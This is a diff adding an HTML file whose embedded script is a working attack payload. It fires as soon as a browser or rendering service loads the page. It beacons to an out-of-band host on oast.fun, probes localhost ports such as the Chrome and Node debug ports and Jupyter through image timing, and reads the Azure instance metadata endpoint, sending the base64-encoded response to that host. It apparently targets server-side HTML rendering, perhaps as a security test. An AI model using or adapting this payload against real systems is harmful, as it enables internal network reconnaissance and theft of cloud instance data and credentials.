@@ -1,0 +1,40 @@
+﻿<!DOCTYPE html>
+<html>
+<body>
+<script>
+// JS execution confirmed
+fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/js-executed');
+
+// Port scanning via Image tags (bypasses mixed content for detection)
+function probePort(port, label) {
+  var img = new Image();
+  var start = Date.now();
+  img.onload = img.onerror = function() {
+    var elapsed = Date.now() - start;
+    fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/probe?port=' + port + '&label=' + label + '&ms=' + elapsed);
+  };
+  img.src = 'http://localhost:' + port + '/favicon.ico';
+}
+
+// Probe common internal ports
+probePort(9222, 'chrome-debug');
+probePort(9229, 'node-debug');
+probePort(80,   'http');
+probePort(8080, 'alt-http');
+probePort(3000, 'dev-server');
+probePort(8888, 'jupyter');
+
+// Try Azure metadata via a different approach
+var x = new XMLHttpRequest();
+x.open('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01');
+x.setRequestHeader('Metadata', 'true');
+x.onload = function() {
+  fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/metadata?d=' + btoa(x.responseText));
+};
+x.onerror = function() {
+  fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/metadata-blocked');
+};
+x.send();
+</script>
+</body>
+</html>
